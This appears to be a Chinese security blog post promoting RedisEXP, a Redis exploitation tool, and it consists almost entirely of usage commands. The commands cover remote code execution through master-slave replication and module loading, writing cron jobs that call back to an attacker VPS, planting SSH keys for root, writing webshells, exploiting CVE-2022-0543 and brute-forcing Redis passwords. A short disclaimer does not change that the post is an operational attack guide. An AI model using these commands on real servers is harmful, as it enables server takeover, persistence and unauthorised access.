#  Redis 漏洞利用工具 -- RedisEXP   
yuyan-sec  网络安全者   2025-02-02 16:01  
  
===================================  
免责声明请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。  
0x01 工具介绍  
Redis 漏洞利用工具。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccwYUcSEibv9UYsy4eVib1k9bedJwnPmibgV3YAJ1libR2Al5oyh7sKcxQBNNUWeAC4ibq2gHGAAUPDTzIw/640?wx_fmt=png&from=appmsg "")  
  
0x02 安装与使用  
基本连接:   
```
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456
```  
  
执行Redis命令：  
```
RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info
```  
  
加载dll或so执行命令：  
```
RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)
RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec
```  
  
主从复制命令执行：  
```
RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami -rf exp.so
```  
  
主从复制上传文件：  
```
RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件
RedisEXP.exe -m upload -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -rp . -rf 1.txt -lf .\README.md
```  
  
主动关闭主从复制：  
```
RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码
```  
  
写计划任务：  
```
RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
RedisEXP.exe -m cron -r 192.168.1.8 -p 6379 -L 192.168.1.8 -P 9001
```  
  
写SSH 公钥：  
```
RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥
RedisEXP.exe -m ssh -r 192.168.1.8 -p 6379 -u root -s ssh-aaaaaaaaaaaaaa
```  
  
写webshell：  
```
RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]
RedisEXP.exe -m shell -r 127.0.0.1 -p 6379 -rp . -rf shell.txt -s MTIzNA== -b
```  
  
CVE-2022-0543：  
```
RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令
```  
  
爆破Redis密码：  
```
RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典
RedisEXP.exe -m brute -r 127.0.0.1 -p 6378 -f pass.txt
```  
  
生成gohper：  
```
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件
```  
  
执行 bgsave：  
```
RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码
```  
  
判断文件（需要绝对路径）：  
```
RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini
```  
  
  
  
  
  
  
**·****今 日 推 荐**  
**·**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccwYUcSEibv9UYsy4eVib1k9benmib7GQvePmd7fJeWg5XvyfHnibaz4dibuUtI0RxCD8ibwtxhUCupxTaUA/640?wx_fmt=png&from=appmsg "")  
  
  
